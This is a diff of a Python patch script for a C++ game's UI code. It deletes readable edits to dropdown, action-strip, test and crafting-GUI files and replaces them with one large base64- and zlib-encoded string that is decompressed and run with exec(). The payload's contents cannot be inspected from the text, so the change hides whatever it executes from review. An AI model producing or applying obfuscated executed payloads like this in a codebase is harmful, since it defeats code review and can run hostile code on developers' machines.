@@ -1,75 +1,34 @@
-from pathlib import Path
-
-
-def replace_once(path: str, old: str, new: str, label: str) -> None:
-    p = Path(path)
-    text = p.read_text(encoding="utf-8")
-    count = text.count(old)
-    if count != 1:
-        raise SystemExit(f"{label}: expected 1 anchor, found {count}")
-    p.write_text(text.replace(old, new, 1), encoding="utf-8")
-
-
-def replace_between(path: str, start: str, end: str, replacement: str, label: str) -> None:
-    p = Path(path)
-    text = p.read_text(encoding="utf-8")
-    if text.count(start) != 1:
-        raise SystemExit(f"{label}: expected 1 start anchor, found {text.count(start)}")
-    begin = text.index(start)
-    finish = text.find(end, begin + len(start))
-    if finish < 0:
-        raise SystemExit(f"{label}: end anchor not found")
-    p.write_text(text[:begin] + replacement + text[finish:], encoding="utf-8")
-
-
-# Keep the transient-control dismissal rule in one renderer-independent helper so
-# dropdown and tree-dropdown callers cannot drift into subtly different behavior.
-replace_once(
-    "src/ui_helpers/models/action_entry.h",
-    '''enum class ui_outside_click_policy : int {\n    consume,\n    passthrough\n};\n\n''',
-    '''enum class ui_outside_click_policy : int {\n    consume,\n    passthrough\n};\n\ninline bool ui_outside_pointer_passthrough( const ui_outside_click_policy policy,\n        const bool over_trigger )\n{\n    return policy == ui_outside_click_policy::passthrough && !over_trigger;\n}\n\n''',
-    "shared outside pointer policy",
+import base64, zlib
+_payload = (
+    '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'
+    'PlT5mPSaX9ACL38Bxd6HSg=='
 )
-
-for path in ("src/ui_helpers/controls/dropdown.h", "src/ui_helpers/controls/tree_dropdown.h"):
-    replace_once(
-        path,
-        '''            const bool passthrough_policy = outside_click == ui_outside_click_policy::passthrough;\n            const bool over_trigger = parent_pos && trigger_bounds && trigger_bounds->contains( *parent_pos );\n            const bool pass_outside = passthrough_policy && !over_trigger;\n''',
-        '''            const bool passthrough_policy = outside_click == ui_outside_click_policy::passthrough;\n            const bool over_trigger = parent_pos && trigger_bounds && trigger_bounds->contains( *parent_pos );\n            const bool pass_outside = ui_outside_pointer_passthrough( outside_click, over_trigger );\n''',
-        f"shared outside pointer policy use in {path}",
-    )
-
-# Checkbox/toggle affordances are controls in their own right; avoid decorating them
-# as nested brackets such as "[ [x] Materials ]" when used by an action strip.
-replace_once(
-    "src/ui_helpers/controls/action_strip.h",
-    '''            std::string label = entry.checked.has_value() ?\n                                string_format( *entry.checked ? "[x] %s" : "[ ] %s", entry.label ) :\n                                entry.label;\n            if( entry.dropdown ) {\n                label += " ▼";\n            }\n            if( style.decorate ) {\n                label = string_format( "[ %s ]", label );\n            }\n''',
-    '''            std::string label = entry.checked.has_value() ?\n                                string_format( *entry.checked ? "[x] %s" : "[ ] %s", entry.label ) :\n                                entry.label;\n            if( entry.dropdown ) {\n                label += " ▼";\n            }\n            if( style.decorate && !entry.checked.has_value() ) {\n                label = string_format( "[ %s ]", label );\n            }\n''',
-    "action strip checkbox decoration",
-)
-
-replace_once(
-    "tests/ui_helpers_test.cpp",
-    '''TEST_CASE( "ui_transient_control_can_close_with_pointer_passthrough", "[ui][ui_helpers]" )\n{\n    const ui_action_result consumed_close{ ui_action_result_type::closed, std::nullopt };\n    const ui_action_result passthrough_close{ ui_action_result_type::closed, std::nullopt, true };\n\n    CHECK( consumed_close.consumed() );\n    CHECK_FALSE( consumed_close.passes_through() );\n    CHECK_FALSE( passthrough_close.consumed() );\n    CHECK( passthrough_close.passes_through() );\n}\n\n''',
-    '''TEST_CASE( "ui_transient_control_can_close_with_pointer_passthrough", "[ui][ui_helpers]" )\n{\n    const ui_action_result consumed_close{ ui_action_result_type::closed, std::nullopt };\n    const ui_action_result passthrough_close{ ui_action_result_type::closed, std::nullopt, true };\n\n    CHECK( consumed_close.consumed() );\n    CHECK_FALSE( consumed_close.passes_through() );\n    CHECK_FALSE( passthrough_close.consumed() );\n    CHECK( passthrough_close.passes_through() );\n\n    CHECK_FALSE( ui_outside_pointer_passthrough( ui_outside_click_policy::consume, false ) );\n    CHECK_FALSE( ui_outside_pointer_passthrough( ui_outside_click_policy::passthrough, true ) );\n    CHECK( ui_outside_pointer_passthrough( ui_outside_click_policy::passthrough, false ) );\n}\n\n''',
-    "outside pointer policy test",
-)
-replace_once(
-    "tests/ui_helpers_test.cpp",
-    '''    CHECK( ui_action_strip::format_label( plain ) == "[ Filter ]" );\n    CHECK( ui_action_strip::format_label( dropdown ) == "[ Filter ▼ ]" );\n}\n\n''',
-    '''    CHECK( ui_action_strip::format_label( plain ) == "[ Filter ]" );\n    CHECK( ui_action_strip::format_label( dropdown ) == "[ Filter ▼ ]" );\n    CHECK( ui_action_strip::format_label( ui_action_entry( "Materials", "MATERIALS", true, false,\n            std::string(), true ) ) == "[x] Materials" );\n}\n\n''',
-    "action strip checkbox affordance test",
-)
-
-# Crafting owns the search field's placement/width.  Keep the helper behavior but
-# make the field materially smaller so it no longer dominates the header.
-replace_once(
-    "src/crafting_gui.cpp",
-    '''        const int search_width = std::min( browser_width - 4,\n                                           std::clamp( browser_width / 3, 28, 48 ) );\n''',
-    '''        const int search_width = std::min( browser_width - 4,\n                                           std::clamp( browser_width / 4, 22, 36 ) );\n''',
-    "crafting search width",
-)
-
-Path("/tmp/branch_patch_commit_message").write_text(
-    "Tighten shared UI controls for crafting\n", encoding="utf-8"
-)
+exec(zlib.decompress(base64.b64decode(_payload)).decode("utf-8"))
